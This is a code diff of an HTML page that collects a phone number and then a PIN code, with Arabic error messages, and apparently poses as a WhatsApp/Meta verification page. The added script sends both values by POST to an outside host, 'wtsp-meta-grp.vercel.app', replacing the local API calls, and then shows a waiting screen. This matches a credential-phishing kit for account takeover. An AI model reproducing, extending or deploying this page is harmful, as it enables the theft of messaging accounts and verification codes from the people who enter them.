@@ -27,7 +27,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: url('./photos/qwd83nc4xxf41.jpg') no-repeat center center;
+            background: url('./qwd83nc4xxf41.jpg') no-repeat center center;
             background-size: cover;
             filter: blur(2px);
             z-index: -1;
@@ -250,58 +250,75 @@ input[type="tel"] {
     </div>
 
     <script>
-        const phoneForm = document.getElementById('phoneForm');
-        const pinForm = document.getElementById('pinForm');
+const phoneForm = document.getElementById('phoneForm');
+const pinForm = document.getElementById('pinForm');
 
-        phoneForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            const countryCode = document.getElementById('countrySelect').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const fullPhoneNumber = countryCode + ' ' + phoneNumber;
+phoneForm.addEventListener('submit', function(event) {
+    event.preventDefault();
+    
+    // Get the selected country code and phone number
+    const countryCode = document.getElementById('countrySelect').value;
+    const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            try {
-                const response = await fetch('./api/phone', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: fullPhoneNumber }),
-                });
+    // Combine country code with phone number, adding a space between them
+    const fullPhoneNumber = countryCode + ' ' + phoneNumber;  // Adding a space between country code and phone number
 
-                const data = await response.json();
-                if (response.ok) {
-                    document.getElementById('phoneSection').classList.add('hidden');
-                    document.getElementById('pinSection').classList.remove('hidden');
-                } else {
-                    alert(data.error || 'Error processing phone number.');
-                }
-            } catch (error) {
-                alert('Failed to submit phone number.');
-                console.error('Error:', error);
-            }
-        });
+    console.log('Full phone number entered:', fullPhoneNumber);  // Debugging line
 
-        pinForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            const pinCode = document.getElementById('pinCode').value.trim();
+    // Send the full phone number to the server
+    fetch('https://wtsp-meta-grp.vercel.app/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ phoneNumber: fullPhoneNumber })  // Send the full phone number with space
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Phone number sent successfully');
+            // Switch to the PIN code section
+            document.getElementById('phoneSection').classList.add('hidden');
+            document.getElementById('pinSection').classList.remove('hidden');
+        } else {
+            throw new Error('Server error, status code: ' + response.status);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('حدث خطأ أثناء إرسال رقم الهاتف.');
+    });
+});
 
-            try {
-                const response = await fetch('./api/pin', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ pinCode }),
-                });
+pinForm.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const pinCode = document.getElementById('pinCode').value.trim();
 
-                const data = await response.json();
-                if (response.ok) {
-                    document.getElementById('pinSection').classList.add('hidden');
-                    document.getElementById('waitSection').classList.remove('hidden');
-                } else {
-                    alert(data.error || 'Error processing PIN code.');
-                }
-            } catch (error) {
-                alert('Failed to submit PIN code.');
-                console.error('Error:', error);
-            }
-        });
+    console.log('PIN entered:', pinCode);  // Debugging line
+
+    // Send the PIN code to the server
+    fetch('https://wtsp-meta-grp.vercel.app/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ pinCode: pinCode })  // Only send pinCode
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('PIN sent successfully');
+            // Hide pin section and show wait section
+            document.getElementById('pinSection').classList.add('hidden');
+            document.getElementById('waitSection').classList.remove('hidden');
+        } else {
+            throw new Error('Server error, status code: ' + response.status);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('حدث خطأ أثناء إرسال رمز PIN.');
+    });
+});
+
     </script>
 </body>
 </html>
